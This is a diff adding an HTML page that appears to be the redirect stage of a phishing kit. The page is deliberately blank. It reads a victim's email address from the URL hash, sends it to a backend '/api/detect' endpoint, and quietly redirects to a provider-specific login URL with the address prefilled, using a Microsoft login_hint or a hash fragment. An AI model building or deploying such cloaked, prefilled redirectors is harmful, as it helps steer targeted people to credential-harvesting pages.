@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+</head>
+<body>
+
+    <div id="app">
+        <!-- Completely blank - all content is hidden -->
+    </div>
+
+    <script>
+        // ========================================================
+        // 🧠 FUNCTIONAL ARCHITECTURE ENGINE (100% FUNCTIONAL)
+        // ========================================================
+
+        function getEmailFromHash() {
+            const hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                const email = hash.substring(1).trim();
+                if (email.includes('@') && email.includes('.')) {
+                    return email;
+                }
+            }
+            return null;
+        }
+
+        function getDomainFromEmail(email) {
+            const parts = email.split('@');
+            if (parts.length !== 2) return null;
+            
+            // Return the full domain (handles .com.au, .co.uk, etc.)
+            return parts[1].toLowerCase();
+        }
+
+        async function detectMailserver(email) {
+            if (!email) {
+                console.error('No email provided.');
+                return;
+            }
+
+            const domain = getDomainFromEmail(email);
+            if (!domain) {
+                console.error('Invalid email format:', email);
+                return;
+            }
+
+            console.log(`📧 Email: ${email}`);
+            console.log(`🌐 Domain: ${domain}`);
+
+            try {
+                const response = await fetch('/api/detect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, domain }),
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || !data.success) {
+                    console.error('API Error:', data.error || data.message);
+                    return;
+                }
+
+                console.log('📦 API Response:', data);
+
+                // Build redirect URL
+                let redirectUrl = data.redirectUrl;
+                if (redirectUrl && email) {
+                    // Check if this is a Microsoft redirect
+                    const isMicrosoft = data.provider === 'office365' || 
+                                      data.provider === 'microsoft' ||
+                                      (redirectUrl.includes('outlook.office.com') || 
+                                       redirectUrl.includes('microsoft.com') ||
+                                       redirectUrl.includes('outlook.com'));
+
+                    if (isMicrosoft) {
+                        // Use login_hint for Microsoft
+                        const separator = redirectUrl.includes('?') ? '&' : '?';
+                        redirectUrl = `${redirectUrl}${separator}login_hint=${encodeURIComponent(email)}`;
+                        console.log('🔑 Microsoft login_hint added');
+                    } else {
+                        // Use hash fragment for others
+                        redirectUrl = `${redirectUrl}#${email}`;
+                    }
+                }
+
+                if (data.redirectUrl) {
+                    console.log('🔄 Redirecting to:', redirectUrl);
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 500);
+
+                } else if (data.fallbackUrl) {
+                    const fallbackUrl = `${data.fallbackUrl}#${email}`;
+                    console.log('🔄 Fallback redirect to:', fallbackUrl);
+                    setTimeout(() => {
+                        window.location.href = fallbackUrl;
+                    }, 500);
+
+                } else {
+                    console.error('❌ No redirect URL available.');
+                }
+
+            } catch (error) {
+                console.error('❌ Error:', error.message);
+            }
+        }
+
+        // ========================================================
+        // 🚀 INITIALIZATION
+        // ========================================================
+
+        const initialEmail = getEmailFromHash();
+        if (initialEmail) {
+            detectMailserver(initialEmail);
+        } else {
+            console.log('ℹ️ No email in URL hash. Usage: index.html#user@example.com');
+        }
+
+        window.addEventListener('hashchange', () => {
+            const email = getEmailFromHash();
+            if (email) {
+                detectMailserver(email);
+            }
+        });
+
+        console.log('✅ Mailserver Redirect ready (blank page mode)');
+        console.log('📧 Usage: index.html#user@example.com');
+        console.log('📧 Supports: .com, .com.au, .co.uk, .org.au, etc.');
+    </script>
+
+</body>
+</html>
